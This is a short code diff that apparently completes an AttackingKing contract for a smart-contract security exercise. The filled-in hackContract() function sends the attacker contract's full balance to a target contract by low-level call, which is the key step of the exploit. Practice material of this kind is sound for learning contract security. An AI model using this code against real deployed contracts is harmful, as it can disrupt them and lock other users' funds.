@@ -11,6 +11,8 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        console.log("---> attackers contract balance:", address(this).balance);
+        // need to use call() instead of transfer() as transfer() would ran out of gas
+        payable(contractAddress).call{value: address(this).balance}("");         
     }
 }
